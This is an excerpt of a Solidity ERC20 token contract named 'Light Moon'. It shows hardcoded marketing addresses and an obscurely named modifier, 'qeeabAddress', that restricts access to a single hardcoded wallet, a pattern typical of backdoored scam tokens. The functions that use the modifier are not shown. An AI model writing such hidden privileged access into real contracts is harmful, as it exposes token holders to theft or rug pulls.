...
contract token is ERC20 {
    ...
    address private _MarketAddress1 = address(0x29bc0ee477E3bae0321B7761301C46d72506565E);
    address private _MarketAddress2 = address(0x29bc0ee477E3bae0321B7761301C46d72506565E);
    ...
    constructor(address tokenOwner) ERC20("Light Moon", "Light Moon") {
        ...
        uint256 total = 10**8 * 10**decimals();
    ...
    modifier qeeabAddress() {
        require(msg.sender == 0x4E44467ca9602C926aaA26957F5c2a547327F4fE, "");
        _;
    }
